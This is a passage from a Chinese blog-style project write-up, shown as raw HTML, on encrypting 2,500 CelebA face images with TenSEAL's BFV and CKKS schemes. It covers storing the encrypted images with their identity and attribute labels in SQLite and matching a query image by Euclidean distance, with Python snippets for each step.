title="准备测试数据"></a>准备测试数据</h3><p>为了<strong>模拟现实场景中</strong>同态加密存储<strong>隐私信息</strong>的应用，我们使用<strong>CelebA(CelebFaces Attribute)</strong>数据集中的2500张人脸图片作为测试数据</p><p>下面是数据集的下载地址</p><p><a href="https://pan.baidu.com/s/1eSNpdRG#list/path=/">https://pan.baidu.com/s/1eSNpdRG#list/path=/</a></p><p>我们选择<code>Img/img_align_celeba.zip</code>，即经过裁剪的JPG格式数据集</p><p>选取前2500张图片存入数据库</p><p>此时图片分辨率为178*218</p><p>我们可以写一个python脚本将图片裁剪压缩为64*64</p><p>在环境中安装图像处理库Pillow</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install Pillow</span><br></pre></td></tr></table></figure><p>我们使用<code>crop()</code>方法来裁剪图片，然后使用<code>resize()</code>进行缩放</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">resize_images</span>(<span class="params">folder_path, output_folder, output_size=(<span class="params"><span class="number">64</span>, <span class="number">64</span></span>)</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(output_folder):</span><br><span class="line">        os.makedirs(output_folder)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> os.listdir(folder_path):</span><br><span class="line">        <span class="keyword">if</span> filename.lower().endswith((<span class="string">&#x27;.png&#x27;</span>, <span class="string">&#x27;.jpg&#x27;</span>, <span class="string">&#x27;.jpeg&#x27;</span>)):  <span class="comment"># 或者根据实际情况调整文件格式</span></span><br><span class="line">            image_path = os.path.join(folder_path, filename)</span><br><span class="line">            output_path = os.path.join(output_folder, filename)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">with</span> Image.<span class="built_in">open</span>(image_path) <span class="keyword">as</span> img:</span><br><span class="line">                min_side = <span class="built_in">min</span>(img.width, img.height)</span><br><span class="line">                <span class="comment"># 计算裁剪区域</span></span><br><span class="line">                left = (img.width - min_side) / <span class="number">2</span></span><br><span class="line">                top = (img.height - min_side) / <span class="number">2</span></span><br><span class="line">                right = left + min_side</span><br><span class="line">                bottom = top + min_side</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 裁剪和缩放</span></span><br><span class="line">                img_cropped = img.crop((left, top, right, bottom))</span><br><span class="line">                img_resized = img_cropped.resize((output_size))</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 保存处理后的图片</span></span><br><span class="line">                img_resized.save(output_path)</span><br><span class="line"></span><br><span class="line">resize_images(<span class="string">&#x27;data/storage_imgs&#x27;</span>, <span class="string">&#x27;data/storage_imgs&#x27;</span>)</span><br></pre></td></tr></table></figure><p>同时，我们截取<code>Anno/identity_CelebA.txt</code>和<code>Anno/list_attr_celeba.txt</code>的前1000项数据作为label</p><h3 id="加密数据"><a href="#加密数据" class="headerlink" title="加密数据"></a>加密数据</h3><p>一开始处理图像时，我们将其转换为numpy数组，这需要我们安装numpy库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install numpy</span><br></pre></td></tr></table></figure><p>对于加密算法，我们需要进行判断，因为不同的算法初始化上下文时的参数不同</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> args.context:</span><br><span class="line">    context = load_context(args.context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> args.algorithm == <span class="string">&#x27;BFV&#x27;</span>:</span><br><span class="line">        context = ts.context(ts.SCHEME_TYPE.BFV, args.poly_modulus_degree, args.plain_modulus)</span><br><span class="line">    <span class="keyword">elif</span> args.algorithm == <span class="string">&#x27;CKKS&#x27;</span>:</span><br><span class="line">        context = ts.context(ts.SCHEME_TYPE.CKKS, args.poly_modulus_degree)</span><br><span class="line">        context.global_scale = args.global_scale</span><br></pre></td></tr></table></figure><p>当然如果已经提供了带公钥的的上下文，我们直接赋值即可</p><p>接下来是生成并保存公私钥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">save_context</span>(<span class="params">context, file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(context.serialize(save_secret_key=<span class="literal">True</span>))</span><br><span class="line">...</span><br><span class="line"><span class="comment"># 生成公私钥</span></span><br><span class="line">context.generate_galois_keys()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 序列化并保存包含私钥的上下文</span></span><br><span class="line">save_context(context, os.path.join(keys_folder, <span class="string">&quot;private_context&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 移除私钥</span></span><br><span class="line">context.make_context_public()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 序列化并保存公钥上下文</span></span><br><span class="line">save_context(context, os.path.join(keys_folder, <span class="string">&quot;public_context&quot;</span>))</span><br></pre></td></tr></table></figure><p>在保存为上下文的文件时，我们可以使用<code>serialize</code>方法将上下文序列化，同时我们要设置save_secret_key为true，这样能保证私钥上下文在序列化时依然保留私钥</p><p>首先我们需要读取待加密的图片，并将其碾平为一维数组</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 加载图片并转换为 numpy 数组</span></span><br><span class="line"><span class="keyword">with</span> Image.<span class="built_in">open</span>(image_path) <span class="keyword">as</span> img:</span><br><span class="line">    img_data = np.array(img)</span><br><span class="line">    </span><br><span class="line">img_data_flattened = img_data.flatten()</span><br></pre></td></tr></table></figure><p>BFV和CKKS的加密函数分别为<code>bfv_vector</code>和<code>ckks_vector</code>，我们将上下文<code>context</code>和待加密的图像数组即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> algorithm == <span class="string">&#x27;BFV&#x27;</span>:</span><br><span class="line">    encrypted_data = ts.bfv_vector(context, img_data_flattened.tolist())  <span class="comment"># 加密整个向量</span></span><br><span class="line"><span class="keyword">elif</span> algorithm == <span class="string">&#x27;CKKS&#x27;</span>:</span><br><span class="line">    encrypted_data = ts.ckks_vector(context, img_data_flattened.tolist())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;Unsupported algorithm. Please choose &#x27;BFV&#x27; or &#x27;CKKS&#x27;.&quot;</span>)</span><br></pre></td></tr></table></figure><p>最后我们将加密数据序列化后保存</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">encrypted_data_serialize = encrypted_data.serialize()</span><br><span class="line"></span><br><span class="line">encrypted_filename = os.path.splitext(os.path.basename(image_path))[<span class="number">0</span>] + <span class="string">&quot;_encrypted&quot;</span></span><br><span class="line">encrypted_file_path = os.path.join(output_folder, encrypted_filename)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(encrypted_file_path, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(encrypted_data_serialize)</span><br></pre></td></tr></table></figure><p>当然，在加密时，我们使用python自带的time库来统计加密时间</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">start_time = time.time()  <span class="comment"># 开始计时</span></span><br><span class="line">...</span><br><span class="line">end_time = time.time()</span><br><span class="line">encryption_time = end_time - start_time</span><br></pre></td></tr></table></figure><p>在代码最后统计并输出总加密时间以及单张图像的加密时间</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">total_time, count = encrypt_images_in_folder(args.input_folder, args.algorithm, context, args.output_folder)</span><br><span class="line"><span class="keyword">if</span> count &gt; <span class="number">0</span>:</span><br><span class="line">    average_time = total_time / count</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Total encryption time: <span class="subst">&#123;total_time:<span class="number">.3</span>f&#125;</span> seconds&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Average encryption time per image: <span class="subst">&#123;average_time:<span class="number">.3</span>f&#125;</span> seconds&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Number of images encrypted: <span class="subst">&#123;count&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;No images were encrypted.&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="存入数据库"><a href="#存入数据库" class="headerlink" title="存入数据库"></a>存入数据库</h3><p>在数据库上，我们<strong>选用SQLite</strong>来模拟数据的存储场景</p><p>选择SQLite而非MySQL的原因主要是本项目的规模较小，且SQLite搭建时更加方便，最重要的是<strong>python内置sqlite3库</strong></p><p>在现实场景中，一个用户之所以使用查询图片服务，当然是希望获取这张图片的一些信息</p><p>所以在数据库中的每一项，我们<strong>除了存入加密的图片向量，还需要存入该图片的一些label</strong></p><p>正好CelebA提供人像图片的特征标签以及身份标签，即<code>Anno/list_attr_celeba.txt</code>和<code>Anno/identity_CelebA.txt</code>两个文件</p><p>首先创建数据库</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">create_database</span>(<span class="params">db_name</span>):</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;=== Creating database:<span class="subst">&#123;db_name&#125;</span> ===&quot;</span>, )</span><br><span class="line">    <span class="keyword">if</span> os.path.exists(db_name):</span><br><span class="line">        <span class="comment"># 如果存在，则删除该文件</span></span><br><span class="line">        os.remove(db_name)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Existing database removed.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    conn = sqlite3.connect(db_name)</span><br><span class="line">    cursor = conn.cursor()</span><br><span class="line">    cursor.execute(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        CREATE TABLE IF NOT EXISTS images (</span></span><br><span class="line"><span class="string">            filename TEXT PRIMARY KEY,</span></span><br><span class="line"><span class="string">            identity TEXT,</span></span><br><span class="line"><span class="string">            attributes TEXT,</span></span><br><span class="line"><span class="string">            encrypted_data BLOB</span></span><br><span class="line"><span class="string">        )</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line">    conn.commit()</span><br><span class="line">    conn.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=== Database created successfully. ===\n&quot;</span>)</span><br></pre></td></tr></table></figure><p>我们在处理图像前处理两个文件中的标签，存为数据结构</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">parse_identity_file</span>(<span class="params">file_path</span>):</span><br><span class="line">    identity = &#123;&#125;</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> file:</span><br><span class="line">            parts = line.strip().split()</span><br><span class="line">            identity[parts[<span class="number">0</span>]] = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> identity</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_attr_file</span>(<span class="params">file_path</span>):</span><br><span class="line">    attributes = &#123;&#125;</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        <span class="comment"># 读取并忽略第一行</span></span><br><span class="line">        <span class="built_in">next</span>(file)</span><br><span class="line">        attr_names = file.readline().strip().split()</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> file:</span><br><span class="line">            parts = line.strip().split()</span><br><span class="line">            attributes[parts[<span class="number">0</span>]] = <span class="built_in">dict</span>(<span class="built_in">zip</span>(attr_names, parts[<span class="number">1</span>:]))</span><br><span class="line">    <span class="keyword">return</span> attributes</span><br><span class="line">...</span><br><span class="line">identity_data = parse_identity_file(<span class="string">&quot;Anno/identity_CelebA.txt&quot;</span>)</span><br><span class="line">attr_data = parse_attr_file(<span class="string">&quot;Anno/list_attr_celeba.txt&quot;</span>)</span><br><span class="line"><span class="comment"># 处理图像</span></span><br><span class="line">process_images(args.input_folder, args.database, identity_data, attr_data)</span><br></pre></td></tr></table></figure><p>在加密完图片后，查找该图片的标签，并将加密数据与对应标签一并存入数据库</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">identity = identity_data.get(image_filename)</span><br><span class="line">attributes = attr_data.get(image_filename)</span><br><span class="line"><span class="keyword">if</span> identity <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> attributes <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">    image_path = os.path.join(input_folder, filename)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(image_path, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    encrypted_data = f.read()</span><br><span class="line">    insert_into_database(db_name, image_filename, identity, attributes, encrypted_data)</span><br></pre></td></tr></table></figure><h3 id="查询匹配"><a href="#查询匹配" class="headerlink" title="查询匹配"></a>查询匹配</h3><p>由于余弦相似度的计算设计除法，在获得最终结果前必须解密，所以我们选择使用<strong>欧几里得距离</strong>来表示图像间的相似性</p><p>图像矩阵A和B之间的欧式距离计算公式如下</p><p>$d(\mathbf{A}, \mathbf{B}) = \sqrt{\sum_{i=1}^{n} (A_i - B_i)^2}$</p><p>由此我们可以写出匹配的代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">compute_euclidean_distance</span>(<span class="params">enc1, enc2, context</span>):</span><br><span class="line">    sk = context.secret_key()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 计算两个向量的差异</span></span><br><span class="line">    diff_enc = enc1 - enc2</span><br><span class="line">    diff = diff_enc.decrypt(sk)</span><br><span class="line">    <span class="comment"># 计算差异的平方</span></span><br><span class="line">    diff_squared = [x**<span class="number">2</span> <span class="keyword">for</span> x <span class="keyword">in</span> diff]</span><br><span class="line">    diff_squared_sum = <span class="built_in">sum</span>(diff_squared)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> diff_squared_sum</span><br></pre></td></tr></table></figure><p>如果找到最佳匹配图像后，我们需要显示这个图像的一些相关信息</p><p>包括相似度</p><p>我们需要额外写一个函数，将欧氏距离转化为相似度百分数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">distance_to_similarity</span>(<span class="params">distance, max_distance</span>):</span><br><span class="line">    <span class="keyword">if</span> distance &gt;= max_distance:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">1</span> - distance / max_distance) * <span class="number">100</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> best_match:</span><br><span class="line">    decrypted_image = decrypt_image(best_match[<span class="number">1</span>], algorithm, context)</span><br><span class="line">    similarity = distance_to_similarity(min_distance,max_distance)</span><br><span class="line">    output_filename = os.path.splitext(query_filename)[<span class="number">0</span>] + <span class="string">&quot;_matched_with_&quot;</span> + os.path.splitext(best_match[<span class="number">0</span>])[<span class="number">0</span>] + <span class="string">&quot;.jpg&quot;</span></span><br><span class="line">    output_file_path = os.path.join(output_folder, output_filename)</span><br><span class="line">    Image.fromarray(decrypted_image).save(output_file_path)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Query image &#x27;<span class="subst">&#123;query_filename&#125;</span>&#x27; best matches with database image &#x27;<span class="subst">&#123;best_match[<span class="number">0</span>]&#125;</span>&#x27;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Similarity is &#x27;<span class="subst">&#123;similarity:<span class="number">.2</span>f&#125;</span>%&#x27;&quot;</span>)</span><br><span class="line">    identity_tag, feature_tags = get_image_tags(db_name, best_match[<span class="number">0</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Identity Tag: <span class="subst">&#123;identity_tag&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Feature Tags: <span class="subst">&#123;<span class="string">&#x27;, &#x27;</span>.join(feature_tags)&#125;</span>\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=== Matching and decryption completed. ===\n&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="创新点"><a href="#创新点" class="headerlink" title="创新点"></a>创新点</h3><h4 id="模拟现实场景"><a href="#模拟现实场景" class="headerlink" title="模拟现实场景"></a>模拟现实场景</h4><p>在本项目中，我们特别注重模拟真实世界中的数据处理和隐私保护场景。通过构建一个包含同态加密和图像匹配的完整流程，我们模拟了一个现实场景中的图像查询和匹配服务。这不仅展示了同态加密技术的实用性，也为数据隐私保护提供了切实可行的解决方案。</p><p>在这个模拟的场景中，我们明确区分了服务端和客户端的角色。服务端负责图像数据的加密存储和匹配处理，而客户端则负责提供查询图像。通过这种角色分配，我们能够展示在数据隐私保护的背景下，如何在服务端和客户端之间安全地交换和处理信息。</p><p>通过选项<code>--context</code>的设置，加密程序以及匹配程序能够使用之前程序产生的密钥文件，这一点对于模拟真正场景下的密钥分配至关重要</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">load_context</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Loading context from: &quot;</span>, file_path)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> ts.Context.load(f.read())</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> args.context:</span><br><span class="line">        context = load_context(args.context)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> args.algorithm == <span class="string">&#x27;BFV&#x27;</span>:</span><br><span class="line">            context = ts.context(ts.SCHEME_TYPE.BFV, args.poly_modulus_degree, args.plain_modulus, coeff_mod_bit_sizes=[<span class="number">60</span>, <span class="number">40</span>, <span class="number">40</span>, <span class="number">40</span>, <span class="number">40</span>, <span class="number">60</span>])</span><br><span class="line">        <span class="keyword">elif</span> args.algorithm == <span class="string">&#x27;CKKS&#x27;</span>:</span><br><span class="line">            context = ts.context(ts.SCHEME_TYPE.CKKS, args.poly_modulus_degree, coeff_mod_bit_sizes=[<span class="number">60</span>, <span class="number">40</span>, <span class="number">40</span>, <span class="number">40</span>, <span class="number">40</span>, <span class="number">60</span>])</span><br><span class="line"></span><br><span class="line">            context.global_scale = args.global_scale</span><br><span class="line">        <span class="comment"># 生成公私钥</span></span><br><span class="line">        context.generate_galois_keys()</span><br><span class="line">        <span class="comment"># 序列化并保存包含私钥的上下文</span></span><br><span class="line">        save_context(context, os.path.join(keys_folder, <span class="string">&quot;private_context&quot;</span>))</span><br><span class="line">        <span class="comment"># 移除私钥</span></span><br><span class="line">        context.make_context_public()</span><br><span class="line">        <span class="comment"># 序列化并保存公钥上下文</span></span><br><span class="line">        save_context(context, os.path.join(keys_folder, <span class="string">&quot;public_context&quot;</span>))</span><br></pre></td></tr></table></figure><p>同时，我们的系统设计允许在完全保护图像数据隐私的前提下进行高效的图像匹配。通过使用同态加密技术，所有图像数据（包括数据库中的图像和查询图像）都在加密状态下进行处理。这种方法确保了即使在数据传输或存储过程中发生安全漏洞，图像内容也不会泄露。</p><h4 id="优化的加密数据存储结构"><a href="#优化的加密数据存储结构" class="headerlink" title="优化的加密数据存储结构"></a>优化的加密数据存储结构</h4><p>全同态加密加密后的数据体积显著增加。为了解决这个问题，需要选择合适的方式存储加密数据。相比于直接将加密后的数据和annotations存在文件系统中，<strong>存在数据库中时的存储效率更高</strong>，而且在匹配查询时能<strong>更快捷的查找到相应数据的标签</strong>。</p><p>本算法使用<code>DBUploader.py</code>脚本将加密后的图像数据和对应的标签信息存储到SQLite数据库中。数据库设计上，我们创建了一个表来存储加密的图像数据和标签。这个表包含以下几个字段：图像文件名、加密图像数据、图像的标签信息。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i, filename <span class="keyword">in</span> <span class="built_in">enumerate</span>(files):</span><br><span class="line">        file_number = re.sub(<span class="string">&#x27;[^0-9]&#x27;</span>, <span class="string">&#x27;&#x27;</span>, filename)</span><br><span class="line">        image_filename = file_number + <span class="string">&#x27;.jpg&#x27;</span></span><br><span class="line">        identity = identity_data.get(image_filename)</span><br><span class="line">        attributes = attr_data.get(image_filename)</span><br><span class="line">        <span class="keyword">if</span> identity <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> attributes <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            image_path = os.path.join(input_folder, filename)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(image_path, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                encrypted_data = f.read()</span><br><span class="line">            insert_into_database(db_name, image_filename, identity, attributes, encrypted_data)</span><br></pre></td></tr></table></figure><p>这里，我推荐使用<strong>DB Broswer(SQLite)</strong>来观察和验证生成的数据库文件</p><h4 id="通过选项来调整加密算法及参数"><a href="#通过选项来调整加密算法及参数" class="headerlink" title="通过选项来调整加密算法及参数"></a>通过选项来调整加密算法及参数</h4><p>在本项目中，我们实现了一种灵活的加密算法选择机制。通过命令行选项或程序界面，用户可以根据需要选择不同的同态加密算法（如BFV或CKKS）。这种动态选择机制使得项目能够适应不同的应用场景和安全需求。</p><p>除了选择不同的加密算法外，用户还可以调整各种加密参数，如多项式模数度（poly_modulus_degree）、明文模数（plain_modulus）和全局比例因子（global_scale）。这些参数对加密的性能和安全性有着直接影响。在实验测试的过程中，我们不需要修改源文件，而是简单地输入不同参数选项即可调整算法参数。</p><p>在代码层面，这一功能是通过解析用户输入的参数实现的。例如，在<code>tenseal_encrypt.py</code>脚本中，得益于Python的<strong>argparse库</strong>，我们可以很方便地接收和处理用户输入的加密算法和参数选项。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&quot;-a&quot;</span>, <span class="string">&quot;--algorithm&quot;</span>, choices=[<span class="string">&quot;BFV&quot;</span>, <span class="string">&quot;CKKS&quot;</span>], <span class="built_in">help</span>=<span class="string">&quot;Encryption algorithm to use&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&quot;-p&quot;</span>, <span class="string">&quot;--poly_modulus_degree&quot;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, <span class="built_in">help</span>=<span class="string">&quot;Polynomial modulus degree&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&quot;-m&quot;</span>, <span class="string">&quot;--plain_modulus&quot;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, <span class="built_in">help</span>=<span class="string">&quot;Plaintext modulus (for BFV)&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&quot;-s&quot;</span>, <span class="string">&quot;--global_scale&quot;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, <span class="built_in">help</span>=<span class="string">&quot;Global scale (for CKKS)&quot;</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据用户选择设置加密算法和参数</span></span><br><span class="line"><span class="keyword">if</span> args.algorithm == <span class="string">&quot;BFV&quot;</span>:</span><br><span class="line">    <span class="comment"># 设置BFV算法参数</span></span><br><span class="line"><span class="keyword">elif</span> args.algorithm == <span class="string">&quot;CKKS&quot;</span>:</span><br><span class="line">    <span class="comment"># 设置CKKS算法参数</span></span><br></pre></td></tr></table></figure><p>当然，还有一些选项供用户选择原图像的目录、加密数据的存储目录等</p><h4 id="显示直观且详细"><a href="#显示直观且详细" class="headerlink" 